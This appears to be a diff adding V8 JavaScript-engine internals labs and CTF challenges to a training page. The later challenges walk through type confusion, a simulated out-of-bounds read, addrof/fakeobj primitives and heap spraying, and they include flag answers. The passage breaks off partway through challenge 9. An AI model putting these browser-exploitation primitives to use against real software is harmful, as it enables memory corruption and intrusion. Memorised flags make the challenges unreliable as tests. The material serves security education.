+add(5, 6);
+
+// Step 5: Check status — should be optimized
+console.log("Status after:", %GetOptimizationStatus(add));
+
+// Step 6: Trigger deoptimization by violating type assumptions
+console.log("Triggering deopt...");
+add("hello", "world");  // Passes string → deopt!
+
+console.log("Status after deopt:", %GetOptimizationStatus(add));</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run and observe the <code>[marking add for optimization]</code> trace message</li>
+              <li>Note the deoptimization reason in the trace output</li>
+              <li>Decode <code>%GetOptimizationStatus</code> return values (bitmask: bit 0 = is_function, bit 1 = never_optimized, bit 4 = optimized, etc.)</li>
+              <li>Modify the function to prevent deopt — how would you write a function that stays optimized?</li>
+              <li>Use <code>%NeverOptimizeFunction</code> and verify it stays in Ignition</li>
+            </ol>
+          </div>
+        </div>
+
+        <!-- LAB 6 -->
+        <div class="lab-card">
+          <h4>Lab 6: Read TurboFan IR with Turbolizer</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Generate TurboFan IR graphs and analyze them in the Turbolizer visualizer.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// lab6_turbolizer.js
+function vulnerable(arr, idx) {
+  return arr[idx];
+}
+
+%PrepareFunctionForOptimization(vulnerable);
+let a = [1.1, 2.2, 3.3, 4.4];
+vulnerable(a, 0);
+vulnerable(a, 1);
+%OptimizeFunctionOnNextCall(vulnerable);
+vulnerable(a, 2);</code></pre>
+<pre><code class="language-bash"># Generate TurboFan IR
+d8 --allow-natives-syntax --trace-turbo lab6_turbolizer.js
+
+# This creates turbo-vulnerable-*.json
+ls turbo-*.json
+
+# Open Turbolizer
+# https://v8.github.io/tools/turbolizer/
+# Load the JSON file and explore phases:
+#   - Typed Lowering
+#   - Simplified Lowering (where bounds checks get inserted/removed)
+#   - Effect/Control linearization
+#   - Register allocation
+#   - Final code generation</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Generate the IR and load it in Turbolizer</li>
+              <li>Find the <code>CheckBounds</code> node — this is the bounds check for <code>arr[idx]</code></li>
+              <li>Find the <code>LoadElement</code> node — this is the actual memory load</li>
+              <li>Trace the data flow from the <code>Parameter</code> nodes to the <code>Return</code> node</li>
+              <li>Find the <code>CheckMaps</code> node — what Map does it expect?</li>
+              <li>Compare IR at "TyperPhase" vs "SimplifiedLowering" — note how types get narrowed</li>
+            </ol>
+          </div>
+        </div>
+
+        <!-- LAB 7 -->
+        <div class="lab-card">
+          <h4>Lab 7: Inspect the Heap with GDB</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Attach GDB to d8 and manually inspect V8 heap objects at the memory level.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// lab7_gdb.js
+let obj = { a: 0x41, b: 0x42, c: 0x43 };
+let arr = [1.1, 2.2, 3.3];
+let buf = new ArrayBuffer(64);
+
+%SystemBreak();  // Triggers SIGTRAP — GDB breakpoint
+%DebugPrint(obj);
+%DebugPrint(arr);
+%DebugPrint(buf);</code></pre>
+<pre><code class="language-bash"># Run under GDB
+gdb -q --args ./out/x64.debug/d8 --allow-natives-syntax lab7_gdb.js
+(gdb) source tools/gdbinit
+(gdb) run
+
+# When it hits %SystemBreak(), examine memory:
+(gdb) continue   # let %DebugPrint run and note the addresses
+
+# For an object at 0x1234 (with tag bit 1):
+(gdb) x/8xg 0x1234-1
+#   +0x00: Map pointer
+#   +0x08: Properties (FixedArray)
+#   +0x10: Elements  (FixedArray)
+#   +0x18: in-object property "a" = Smi(0x41)
+#   +0x20: in-object property "b" = Smi(0x42)
+#   +0x28: in-object property "c" = Smi(0x43)
+
+# Use V8 GDB helper:
+(gdb) job 0x1234   # Prints formatted V8 object</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run the script under GDB and let <code>%DebugPrint</code> print addresses</li>
+              <li>Manually dump <code>obj</code> with <code>x/8xg</code> — identify each field</li>
+              <li>Verify SMI encoding: <code>0x41 &lt;&lt; 32</code> for the value of property <code>a</code></li>
+              <li>Inspect the array's elements backing store — find the FixedDoubleArray values</li>
+              <li>Find the ArrayBuffer's <code>backing_store</code> pointer and read its contents</li>
+            </ol>
+          </div>
+        </div>
+
+        <!-- LAB 8 -->
+        <div class="lab-card">
+          <h4>Lab 8: Pointer Compression in Practice</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Understand pointer compression by examining compressed vs full pointers in GDB.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// lab8_compression.js
+let a = { x: 1 };
+let b = { x: 2 };
+let container = { ref_a: a, ref_b: b };
+
+%DebugPrint(a);
+%DebugPrint(b);
+%DebugPrint(container);
+%SystemBreak();</code></pre>
+<pre><code class="language-bash"># Run under GDB (debug build)
+gdb -q --args ./out/x64.debug/d8 --allow-natives-syntax lab8_compression.js
+
+# After %DebugPrint shows addresses, examine container:
+# In-object properties store compressed (32-bit) pointers to a and b
+
+# Examine the cage base register
+(gdb) info registers r13   # (or whatever register holds the cage base)
+
+# Verify: full_address = cage_base + compressed_pointer
+# (gdb) p/x $r13 + 0x08040a21
+
+# Check if two objects are in the same cage
+# (gdb) p/x &lt;addr_a&gt; &amp; 0xFFFFFFFF00000000
+# (gdb) p/x &lt;addr_b&gt; &amp; 0xFFFFFFFF00000000
+# Should be the same = cage base</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Find the cage base register value</li>
+              <li>Verify that all heap object addresses share the same upper 32 bits</li>
+              <li>In the <code>container</code> object, find the compressed 32-bit values of <code>ref_a</code> and <code>ref_b</code></li>
+              <li>Manually compute full addresses from compressed pointers and verify with <code>job</code></li>
+            </ol>
+          </div>
+        </div>
+
+        <!-- LAB 9 -->
+        <div class="lab-card">
+          <h4>Lab 9: ArrayBuffer Internals</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Understand the memory layout of ArrayBuffers and TypedArrays, and how they relate to exploit primitives.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// lab9_arraybuffer.js
+let ab = new ArrayBuffer(0x40);
+let u8 = new Uint8Array(ab);
+let f64 = new Float64Array(ab);
+let u32 = new Uint32Array(ab);
+
+// Write a known pattern
+u8[0] = 0x41; u8[1] = 0x41; u8[2] = 0x41; u8[3] = 0x41;
+u8[4] = 0x42; u8[5] = 0x42; u8[6] = 0x42; u8[7] = 0x42;
+
+// Same memory, different views
+console.log("u32[0] =", u32[0].toString(16));  // 0x41414141
+console.log("u32[1] =", u32[1].toString(16));  // 0x42424242
+console.log("f64[0] =", f64[0]);               // float representation
+
+%DebugPrint(ab);
+%DebugPrint(u8);
+%SystemBreak();</code></pre>
+<pre><code class="language-bash"># In GDB, after hitting SystemBreak:
+# 1. Find ab's backing_store from %DebugPrint output
+# 2. Examine the raw memory:
+#    (gdb) x/8xb &lt;backing_store_addr&gt;
+#    Should show: 0x41 0x41 0x41 0x41 0x42 0x42 0x42 0x42
+
+# 3. Look at the TypedArray's external_pointer field
+# 4. Verify: TypedArray.external_pointer == ab.backing_store + byte_offset</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Find the <code>backing_store</code> address from the ArrayBuffer's <code>%DebugPrint</code></li>
+              <li>Read the raw memory at that address and verify your pattern</li>
+              <li>Locate the <code>byte_length</code> field — what happens if you corrupt it to 0x1000 in GDB?</li>
+              <li>Create two ArrayBuffers adjacent in memory and verify their backing store layout</li>
+              <li>Examine how the External Pointer Table entry looks (in sandbox-enabled builds)</li>
+            </ol>
+          </div>
+        </div>
+
+        <!-- LAB 10 -->
+        <div class="lab-card">
+          <h4>Lab 10: Builtin Function Analysis</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Read and understand a V8 builtin implementation in Torque/CSA source code.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Navigate to the V8 source
+cd v8/src/builtins/
+
+# Look at Array.prototype.push implementation
+cat array-push.tq
+
+# Key things to find:
+# 1. Fast path: directly appends to FixedArray, bumps length
+# 2. Slow path: falls back to Runtime call
+# 3. Elements kind checks — different code for SMI, Double, Object
+# 4. Grow the backing store if at capacity
+
+# Trace a builtin at runtime:
+d8 --trace-turbo-inlining script.js  # See which builtins get inlined
+
+# Read the Torque-generated CSA C++:
+cat out/x64.debug/gen/torque-generated/src/builtins/array-push-tq-csa-gen.cc</code></pre>
+<pre><code class="language-javascript">// lab10_builtin.js — Observe Array.push behavior
+let a = [1, 2, 3];  // PACKED_SMI, FixedArray capacity ~6
+
+%DebugPrint(a);
+console.log("--- push(4) ---");
+a.push(4);
+%DebugPrint(a);  // Same FixedArray, length bumped
+
+console.log("--- push enough to grow ---");
+for (let i = 0; i < 20; i++) a.push(i);
+%DebugPrint(a);  // New FixedArray allocated, old one is garbage</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Read <code>array-push.tq</code> and identify the fast path condition</li>
+              <li>Find where the elements kind transition happens in the Torque code</li>
+              <li>Use <code>%DebugPrint</code> to observe FixedArray capacity before and after growth</li>
+              <li>Identify the growth formula (new_capacity = old_capacity + old_capacity / 2 + 16)</li>
+              <li>Find a builtin that has had security-relevant bugs (search V8 CVEs mentioning builtins)</li>
+            </ol>
+          </div>
+        </div>
+
+        <!-- LAB 11 -->
+        <div class="lab-card">
+          <h4>Lab 11: Patch Analysis of a Real CVE</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Analyze a real V8 security patch to understand the vulnerability and how it was triggered.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Example: Analyze CVE-2020-6418 (type confusion in TurboFan)
+# Bug: incorrect side-effect modeling in JSCreate lowering
+
+# 1. Find the fix commit
+git log --oneline --all --grep="6418"
+# Or search: https://chromium-review.googlesource.com
+
+# 2. Read the patch
+git show &lt;fix_commit&gt;
+
+# 3. Typical diff for a type confusion fix:
+#    - A node's type was incorrectly narrowed
+#    - The fix adds a proper type check or removes a faulty optimization
+#    - Look for changes in:
+#      src/compiler/node-properties.cc
+#      src/compiler/js-call-reducer.cc
+#      src/compiler/typer.cc
+
+# 4. Build the vulnerable version
+git checkout &lt;fix_commit&gt;^
+tools/dev/gm.py x64.release
+
+# 5. Verify the bug: write a PoC that triggers the incorrect type
+#    (usually involves calling a builtin that transitions element kinds
+#     during TurboFan compilation)</code></pre>
+<pre><code class="language-javascript">// Generic pattern for type confusion bugs:
+// Step 1: Get a function optimized with narrow type feedback
+// Step 2: Trigger a side-effect that changes the object's map/type
+// Step 3: Optimized code still uses the old (wrong) type → confusion
+
+function trigger(arr) {
+  // Side-effect changes elements kind but optimized code
+  // still accesses as the old kind
+  return arr.pop();  // If pop() causes kind transition during opt...
+}
+
+// Warm up
+let a = [1.1, 2.2, 3.3];
+for (let i = 0; i < 100000; i++) {
+  a.push(1.1);
+  trigger(a);
+}</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Pick a V8 CVE (2020-6418, 2021-21224, 2023-2033, or similar)</li>
+              <li>Find the Chromium bug report and the fix CL</li>
+              <li>Read the patch diff — identify which compiler phase was buggy</li>
+              <li>Describe the incorrect assumption that led to the vulnerability</li>
+              <li>Build the vulnerable version and attempt to reproduce the crash/misbehavior</li>
+            </ol>
+          </div>
+        </div>
+
+        <!-- LAB 12 -->
+        <div class="lab-card">
+          <h4>Lab 12: Object Property Storage Modes</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Observe all three property storage modes (in-object, out-of-object fast, dictionary) and understand the transitions.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// lab12_properties.js — d8 --allow-natives-syntax lab12_properties.js
+
+// 1. In-object properties (fastest)
+function Point(x, y) { this.x = x; this.y = y; }
+let p = new Point(1, 2);
+%DebugPrint(p);
+// Check: properties say "none" (stored in-object)
+
+// 2. Out-of-object (fast properties via PropertyArray)
+let big = {};
+for (let i = 0; i < 30; i++) {
+  big["prop_" + String.fromCharCode(65 + (i % 26)) + Math.floor(i/26)] = i;
+}
+%DebugPrint(big);
+// Check: properties show a PropertyArray
+
+// 3. Dictionary mode (slow properties)
+let slow = {};
+for (let i = 0; i < 100; i++) {
+  slow["p" + i] = i;
+}
+// Or force it:
+let slow2 = { a: 1, b: 2 };
+delete slow2.a;
+%DebugPrint(slow2);
+// Check: properties show NameDictionary</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>For in-object properties, find the property values directly in the object's memory dump</li>
+              <li>For out-of-object, find the PropertyArray pointer and dump its contents</li>
+              <li>For dictionary mode, observe the NameDictionary hash table structure</li>
+              <li>Benchmark property access in each mode — how much slower is dictionary?</li>
+              <li>Can you transition from dictionary mode back to fast mode? (Hint: V8 may re-configure under certain conditions)</li>
+            </ol>
+          </div>
+        </div>
+
+        <!-- LAB 13 -->
+        <div class="lab-card">
+          <h4>Lab 13: Garbage Collection Triggers</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Understand when and how V8's garbage collectors run, and how to influence collection timing.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// lab13_gc.js — d8 --allow-natives-syntax --expose-gc --trace-gc lab13_gc.js
+
+// 1. Trigger minor GC (Scavenger)
+console.log("=== Allocating in new space ===");
+for (let i = 0; i < 100000; i++) {
+  let tmp = { x: i, data: [1, 2, 3] };
+}
+// Should see Scavenge events in --trace-gc
+
+// 2. Force major GC
+console.log("=== Forcing major GC ===");
+gc();  // Requires --expose-gc
+
+// 3. Force minor GC
+gc({ type: 'minor' });
+
+// 4. Simulate new space full
+%SimulateNewspaceFull();
+let trigger = { a: 1 };  // Next allocation triggers scavenge
+
+// 5. Object promotion to old space
+let survivors = [];
+for (let i = 0; i < 10; i++) {
+  survivors.push({ gen: i });
+  gc({ type: 'minor' });  // Promote surviving objects
+}
+// Objects that survived 2 scavenges are in old space
+%DebugPrint(survivors[0]);  // Check if in old space</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run with <code>--trace-gc</code> and identify Scavenge vs Mark-Sweep events</li>
+              <li>Note the heap size before and after GC in the trace output</li>
+              <li>Measure how many allocations it takes to trigger a scavenge naturally</li>
+              <li>Force an object from new space to old space by surviving scavenges</li>
+              <li>Observe what happens when old space is full — does V8 expand or compact?</li>
+            </ol>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- ================================================================ -->
+      <!-- CTF TAB                                                          -->
+      <!-- ================================================================ -->
+      <div class="tab-content" id="ctf">
+        <h2>CTF Challenges</h2>
+
+        <!-- CHALLENGE 1 -->
+        <div class="ctf-card">
+          <h4>Challenge 1: Map Transition Detective</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Given the following code, predict the exact Map transition chain and determine which objects share a Map. The flag is the number of unique Maps created.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// challenge1.js — d8 --allow-natives-syntax challenge1.js
+let a = {};
+a.x = 1;
+a.y = 2;
+a.z = 3;
+
+let b = {};
+b.x = 10;
+b.y = 20;
+b.z = 30;
+
+let c = {};
+c.z = 100;
+c.y = 200;
+c.x = 300;
+
+let d = {};
+d.x = 1;
+d.y = 2;
+
+// How many unique Maps exist now?
+// Verify with:
+console.log("a == b?", %HaveSameMap(a, b));
+console.log("a == c?", %HaveSameMap(a, c));
+console.log("a == d?", %HaveSameMap(a, d));
+console.log("b == c?", %HaveSameMap(b, c));
+
+// FLAG format: FLAG{N} where N is the count of unique terminal Maps
+// (don't count intermediate Maps, just the final Map of each variable)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> <code>a</code> and <code>b</code> add properties in the same order → same Map. <code>c</code> adds in different order → different Map. <code>d</code> only adds x,y → different Map (subset of a's chain, not the final map).<br>
+            <strong>Answer:</strong> FLAG{3} — Three unique terminal Maps: one for a/b, one for c, one for d.</p>
+          </div>
+        </div>
+
+        <!-- CHALLENGE 2 -->
+        <div class="ctf-card">
+          <h4>Challenge 2: Elements Kind Oracle</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Predict the final elements kind of each array after all operations. The flag is the concatenation of elements kind abbreviations.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// challenge2.js — d8 --allow-natives-syntax challenge2.js
+
+let arr1 = [1, 2, 3];        // Start: PACKED_SMI
+arr1.push(4);                 // Q: Still PACKED_SMI?
+
+let arr2 = [1, 2, 3];
+arr2.push(1.5);               // Q: What now?
+arr2.length = 2;              // Q: Does truncation change the kind?
+
+let arr3 = [1.1, 2.2, 3.3];
+arr3[0] = 42;                 // Q: Can it go back to SMI?
+
+let arr4 = new Array(5);      // Q: What kind is this?
+arr4[0] = 1;
+
+let arr5 = [1, 2, 3];
+arr5[100] = 4;                // Q: HOLEY or DICTIONARY?
+
+// FLAG format: FLAG{kind1_kind2_kind3_kind4_kind5}
+// Use abbreviations: PS=PACKED_SMI, PD=PACKED_DOUBLE, PE=PACKED_ELEMENTS
+//                    HS=HOLEY_SMI, HD=HOLEY_DOUBLE, HE=HOLEY_ELEMENTS
+
+// Verify each with %HasSmiElements, %HasDoubleElements, etc.</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Answer:</strong> FLAG{PS_PD_PD_HS_HS}<br>
+            <code>arr1</code>: PACKED_SMI (push(4) doesn't change kind).<br>
+            <code>arr2</code>: PACKED_DOUBLE (push(1.5) transitions, truncation doesn't revert).<br>
+            <code>arr3</code>: PACKED_DOUBLE (can't go back from DOUBLE to SMI).<br>
+            <code>arr4</code>: HOLEY_SMI (new Array(5) creates holes).<br>
+            <code>arr5</code>: HOLEY_SMI (gap at indices 3–99 creates holes, but not large enough for dictionary).</p>
+          </div>
+        </div>
+
+        <!-- CHALLENGE 3 -->
+        <div class="ctf-card">
+          <h4>Challenge 3: Deoptimization Trigger</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Write a script that: (1) optimizes a function with TurboFan, (2) triggers exactly one deoptimization, (3) captures the deoptimization reason. The flag is in the <code>--trace-deopt</code> output.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// challenge3.js — d8 --allow-natives-syntax --trace-deopt challenge3.js
+
+function compute(obj) {
+  return obj.x + obj.y;
+}
+
+%PrepareFunctionForOptimization(compute);
+
+// Step 1: Warm up with consistent shape
+let shape1 = { x: 1, y: 2 };
+compute(shape1);
+compute(shape1);
+
+// Step 2: Optimize
+%OptimizeFunctionOnNextCall(compute);
+compute(shape1); // Runs optimized code
+
+// Step 3: YOUR TASK — trigger a deoptimization
+// Write code below that causes compute() to deoptimize
+// The deopt reason contains the flag: FLAG{wrong_map}
+
+// ???
+// Hint: pass an object with a different Map to compute()</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Solution:</strong> Pass an object with a different hidden class:<br>
+            <code>compute({ y: 2, x: 1 });</code> — Different property order = different Map → CheckMaps fails → deoptimization.<br>
+            The <code>--trace-deopt</code> output will show: <code>[deoptimizing: ... wrong map]</code><br>
+            <strong>Flag:</strong> FLAG{wrong_map}</p>
+          </div>
+        </div>
+
+        <!-- CHALLENGE 4 -->
+        <div class="ctf-card">
+          <h4>Challenge 4: Read the Optimized Code</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Optimize a function and find the x86-64 instruction that performs the actual addition. The flag is the mnemonic of the instruction V8 emits for the integer add.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// challenge4.js — d8 --allow-natives-syntax --print-opt-code --code-comments challenge4.js
+
+function addInts(a, b) {
+  return a + b;
+}
+
+%PrepareFunctionForOptimization(addInts);
+addInts(1, 2);
+addInts(3, 4);
+%OptimizeFunctionOnNextCall(addInts);
+let result = addInts(5, 6);
+
+// In the --print-opt-code output, find:
+// 1. The CheckSmi guard instructions
+// 2. The actual add instruction
+// 3. The deoptimization jump (if check fails)
+
+// FLAG format: FLAG{instruction_mnemonic}
+// e.g., if the add is done with "addl" → FLAG{addl}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Hint:</strong> Look for the code section marked <code>;; code for add</code> or similar comment in the output. On x86-64, integer addition on SMIs (which are tagged) typically uses <code>addl</code> (32-bit add on compressed SMIs) or <code>addq</code>. Since SMIs are stored shifted, the add operates on the tagged values directly.<br>
+            <strong>Flag:</strong> FLAG{addl} (on most V8 builds with pointer compression)</p>
+          </div>
+        </div>
+
+        <!-- CHALLENGE 5 -->
+        <div class="ctf-card">
+          <h4>Challenge 5: Type Confusion Setup</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Create a scenario where TurboFan compiles a function expecting a <code>PACKED_DOUBLE_ELEMENTS</code> array but receives a <code>PACKED_ELEMENTS</code> array at runtime. Describe what memory corruption would occur.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// challenge5.js — d8 --allow-natives-syntax challenge5.js
+
+// EDUCATIONAL: This demonstrates the concept of type confusion.
+// In a real bug, TurboFan would fail to insert a proper CheckMaps.
+
+function readElement(arr) {
+  // TurboFan compiles this assuming PACKED_DOUBLE_ELEMENTS
+  // Emits LoadElement with double semantics (reads 8 bytes as float64)
+  return arr[0];
+}
+
+%PrepareFunctionForOptimization(readElement);
+let doubles = [1.1, 2.2, 3.3];
+readElement(doubles);
+readElement(doubles);
+%OptimizeFunctionOnNextCall(readElement);
+readElement(doubles);  // Optimized for doubles
+
+// If CheckMaps were missing (hypothetical bug):
+let objects = [{}];   // PACKED_ELEMENTS — stores tagged pointers
+// readElement(objects) would read a tagged pointer as a float64!
+
+// Q1: What value would you get if a pointer 0x08040a21 is read as float64?
+// Q2: Why is this useful for an attacker?
+// Q3: What primitive does this give you?
+
+// FLAG: FLAG{pointer_leaked_as_double}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Answer:</strong> If the optimized code reads a tagged pointer as a float64 value, the attacker learns the raw pointer value — this is an <strong>addrof</strong> primitive. The 8 bytes at the element slot (which are a compressed pointer + tag) get reinterpreted as an IEEE 754 double.<br>
+            Conversely, writing a crafted double to a slot expected to hold a pointer gives a <strong>fakeobj</strong> primitive — you can make V8 treat an arbitrary address as an object.<br>
+            <strong>Flag:</strong> FLAG{pointer_leaked_as_double}</p>
+          </div>
+        </div>
+
+        <!-- CHALLENGE 6 -->
+        <div class="ctf-card">
+          <h4>Challenge 6: OOB Array Access</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Educational: Given a simulated OOB read primitive on a V8 array, determine what objects you can read past the array boundary and construct an <code>addrof</code> primitive.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// challenge6_oob.js — EDUCATIONAL exploit primitive construction
+// Simulates a bug where arr.length is corrupted to allow OOB access
+
+// Setup: two arrays adjacent in memory
+let oob_arr = [1.1, 2.2, 3.3, 4.4];  // PACKED_DOUBLE_ELEMENTS
+let victim  = [{}];                     // PACKED_ELEMENTS (tagged ptrs)
+
+// Simulated OOB: if oob_arr's length were corrupted to 100,
+// reading oob_arr[6] or oob_arr[7] would read into victim's header/elements
+
+// TASKS:
+// 1. Use %DebugPrint on both arrays — calculate their memory distance
+// 2. Determine which OOB index from oob_arr reads victim's elements[0]
+// 3. Reading victim.elements[0] as a double gives you the pointer
+//    to the object stored at victim[0] — this is addrof!
+// 4. Writing a double to that slot gives you fakeobj!
+
+// Helper: float-to-int conversion (V8 exploit utility)
+let buf = new ArrayBuffer(8);
+let f64 = new Float64Array(buf);
+let u32 = new Uint32Array(buf);
+let u64 = new BigUint64Array(buf);
+
+function ftoi(f) { f64[0] = f; return u64[0]; }
+function itof(i) { u64[0] = i; return f64[0]; }
+function hex(i) { return "0x" + i.toString(16); }
+
+// Example addrof (conceptual):
+// function addrof(obj) {
+//   victim[0] = obj;
+//   return ftoi(oob_arr[OOB_INDEX]);
+// }
+
+// FLAG: FLAG{addrof_fakeobj_from_type_confusion}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Approach:</strong><br>
+            1. Use <code>%DebugPrint(oob_arr)</code> and <code>%DebugPrint(victim)</code> to find their addresses and their elements backing store addresses.<br>
+            2. Calculate: <code>oob_index = (victim_elements_addr - oob_elements_data_start) / 8</code><br>
+            3. <code>addrof(obj)</code>: set <code>victim[0] = obj</code>, read <code>oob_arr[oob_index]</code> as double, convert to int → gives the tagged pointer.<br>
+            4. <code>fakeobj(addr)</code>: write <code>oob_arr[oob_index] = itof(addr)</code>, read <code>victim[0]</code> → V8 treats addr as a HeapObject.<br>
+            <strong>Flag:</strong> FLAG{addrof_fakeobj_from_type_confusion}</p>
+          </div>
+        </div>
+
+        <!-- CHALLENGE 7 -->
+        <div class="ctf-card">
+          <h4>Challenge 7: Build addrof/fakeobj Primitives</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Educational: Using a simulated OOB vulnerability, implement working <code>addrof()</code> and <code>fakeobj()</code> helper functions and verify them.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// challenge7_primitives.js — EDUCATIONAL
+
+// Float↔Int conversion utilities
+let buf = new ArrayBuffer(8);
+let f64 = new Float64Array(buf);
+let u64 = new BigUint64Array(buf);
+function ftoi(f) { f64[0] = f; return u64[0]; }
+function itof(i) { u64[0] = i; return f64[0]; }
+function hex(n) { return "0x" + n.toString(16); }
+
+// Assume: you have OOB read/write on `oob_arr` that can reach `victim`
+// oob_arr: PACKED_DOUBLE_ELEMENTS (doubles stored unboxed)
+// victim:  PACKED_ELEMENTS (objects stored as tagged pointers)
+
+// YOUR TASK: Implement these functions
+function addrof(obj) {
+  // 1. Place obj into victim[0]
+  // 2. Read the overlapping slot from oob_arr as a double
+  // 3. Convert double to integer (BigInt) → this is the tagged pointer
+  // IMPLEMENT ME
+}
+
+function fakeobj(addr) {
+  // 1. Convert addr (BigInt) to a double
+  // 2. Write it to the overlapping slot via oob_arr
+  // 3. Read victim[0] → V8 treats the written address as a HeapObject
+  // IMPLEMENT ME
+}
+
+// Verification:
+// let test_obj = { marker: 0xdead };
+// let addr = addrof(test_obj);
+// console.log("addrof:", hex(addr));
+// let recovered = fakeobj(addr);
+// console.log("Same object?", recovered === test_obj);  // should be true
+
+// FLAG: FLAG{arbitrary_rw_next_step}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Implementation pattern:</strong></p>
+<pre><code class="language-javascript">const OOB_IDX = /* calculated offset */;
+
+function addrof(obj) {
+  victim[0] = obj;
+  return ftoi(oob_arr[OOB_IDX]);
+}
+
+function fakeobj(addr) {
+  oob_arr[OOB_IDX] = itof(addr);
+  return victim[0];
+}</code></pre>
+            <p>After addrof/fakeobj, the next step is building arbitrary R/W. Create a fake ArrayBuffer-like object with a controlled backing_store pointer to read/write arbitrary memory. Post-sandbox V8 requires escaping the sandbox (e.g., via WASM or corrupting the External Pointer Table).<br>
+            <strong>Flag:</strong> FLAG{arbitrary_rw_next_step}</p>
+          </div>
+        </div>
+
+        <!-- CHALLENGE 8 -->
+        <div class="ctf-card">
+          <h4>Challenge 8: Heap Layout Prediction</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Predict the heap layout of specific allocations and verify your predictions with GDB. The flag is the hex offset between two objects.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// challenge8_heap.js — d8 --allow-natives-syntax challenge8_heap.js
+
+// Allocate objects in sequence — they should be adjacent in new space
+gc();  // Clean slate
+
+let marker1 = { id: 0xAAAA };
+let arr = [1.1, 2.2, 3.3, 4.4];  // FixedDoubleArray elements
+let marker2 = { id: 0xBBBB };
+
+%DebugPrint(marker1);
+%DebugPrint(arr);
+%DebugPrint(marker2);
+
+// TASKS:
+// 1. Note the addresses of all three objects
+// 2. Calculate the distance (in bytes) between marker1 and arr
+// 3. Calculate the distance between arr's elements and marker2
+// 4. Are they contiguous? What's between them?
+// 5. Does the elements backing store sit between the JSArray and marker2?
+
+// FLAG format: FLAG{hex_offset_marker1_to_arr}
+// Example: if marker1 is at 0x1000 and arr is at 0x1040, FLAG{0x40}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Approach:</strong> V8's bump-pointer allocator in new space allocates sequentially. Objects are laid out in order: marker1's JSObject (header + in-object props), then arr's JSArray header, then arr's FixedDoubleArray elements, then marker2. The exact offset depends on object sizes:<br>
+            - JSObject with 1 in-object prop: ~40 bytes (map + props + elements + prop)<br>
+            - JSArray header: ~32 bytes<br>
+            - FixedDoubleArray with 4 elements: ~48 bytes (header + 4×8)<br>
+            Run <code>%DebugPrint</code> and subtract addresses to find the exact offsets.</p>
+          </div>
+        </div>
+
+        <!-- CHALLENGE 9 -->
+        <div class="ctf-card">
+          <h4>Challenge 9: GC Trigger Exploit Stability</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Write a heap spray that survives garbage collection and maintains a predictable layout. The flag is the technique name.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// challenge9_gc.js — d8 --allow-natives-syntax --expose-gc --trace-gc challenge9_gc.js
+
+// Problem: GC moves objects → breaks exploit assumptions
+// Solution: Promote objects to old space where they're stable
+
+// Step 1: Allocate and promote
+let stable_arrays = [];
+for (let i = 0; i < 100; i++) {
+  stable_arrays.push(new Array(64).fill(1.1));
+}
+// Force scavenges to promote to old space
+gc({ type: 'minor' });
+gc({ type: 'minor' });
+gc({ type: 'minor' });
+
